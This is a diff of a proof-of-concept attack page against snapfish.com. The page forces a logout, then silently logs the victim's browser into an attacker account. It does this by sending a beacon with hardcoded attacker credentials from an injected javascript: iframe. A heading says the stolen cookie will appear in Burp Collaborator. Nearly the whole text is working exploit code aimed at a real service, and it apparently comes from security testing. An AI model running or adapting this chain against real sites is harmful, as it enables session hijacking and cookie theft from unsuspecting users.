@@ -3,6 +3,7 @@
 <html>
 
 <body>
+    <h1>Cookie will be shown in Burp Collaborator</h1>
     <script type="text/javascript">
         function step1() {
             const handle = window.open("https://www.snapfish.com/logout","_blank");
@@ -11,15 +12,23 @@
         }
 
         function step2(){
-            //Log in to attacker account
 
+            const login_code = `
             var body = "iwPreActions=submit&pnsUrl=%2Floginto&next=https%253A%252F%252Fwww.snapfish.com%252Fhome%253Floginwith%253Demail&SECURITY_CSRFTOKEN=&SubscriptionFlag=checked&EmailAddress=attackeroqn3vg%40khara.one&Password=NewPassword%212024";
             var aBody = new Uint8Array(body.length);
             for (var i = 0; i < aBody.length; i++)
             aBody[i] = body.charCodeAt(i); 
 
 
-            navigator.sendBeacon("https:\/\/www.snapfish.com\/loginto?submit=true&componentID=1395868004571", new Blob([aBody], { type: "application/x-www-form-urlencoded" }))
+            navigator.sendBeacon("https:\/\/www.snapfish.com\/loginto?submit=true&componentID=1395868004571", new Blob([aBody], { type: "application/x-www-form-urlencoded" }));
+            `;
+            var attackerLoginFrame = document.createElement('iframe');
+            attackerLoginFrame.setAttribute('src', 'javascript:'+ login_code );
+            attackerLoginFrame.setAttribute('width', '100px');
+            attackerLoginFrame.setAttribute('height', '100px');
+            attackerLoginFrame.setAttribute('style', 'position:absolute;z-index:999;top: 100px;');
+            //Log in to attacker account
+            document.body.appendChild(attackerLoginFrame);
         }
 
         function step3(){
